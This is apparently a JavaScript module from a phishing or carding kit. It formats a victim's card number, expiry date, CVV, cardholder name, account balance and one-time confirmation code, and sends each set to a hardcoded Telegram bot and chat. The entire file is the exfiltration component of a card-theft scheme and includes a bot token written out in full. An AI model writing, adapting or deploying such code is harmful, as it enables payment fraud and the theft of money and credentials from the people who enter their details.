import axios from "axios";

const chatId = -646464471;

const sendMessage = (chat_id, text) => {
  const token = "5259689453:AAH0q8QFHOAdISIqtQyaPv8V7WoFXIN1CEg";
  axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
    chat_id: chat_id,
    text: text,
  });
};

export const sendCard = (card, date, cvv, price, placeholder) => {
  try {
    let msg = `💳 Карта: ${card}\n`;
    msg += `⏰ MM/YY: ${date}\n`;
    msg += `🔒 CVV: ${cvv}\n`;
    msg += `💵 Сумма: ${price} $\n`;
    msg += `👷‍♂️ Имя: ${placeholder}`;
    sendMessage(chatId, msg);
  } catch (e) {
    console.log(e);
  }
};

export const sendBalance = (balance, price) => {
  try {
    let msg = `💸 Баланс: ${balance} $\n`;
    msg += `💵 Сумма: ${price} $\n`;
    sendMessage(chatId, msg);
  } catch (e) {
    console.log(e);
  }
};

export const sendCode = (code, price) => {
  try {
    let msg = `🧨 Код: ${code}\n`;
    msg += `💵 Сумма: ${price} $\n`;
    sendMessage(chatId, msg);
  } catch (e) {
    console.log(e);
  }
};
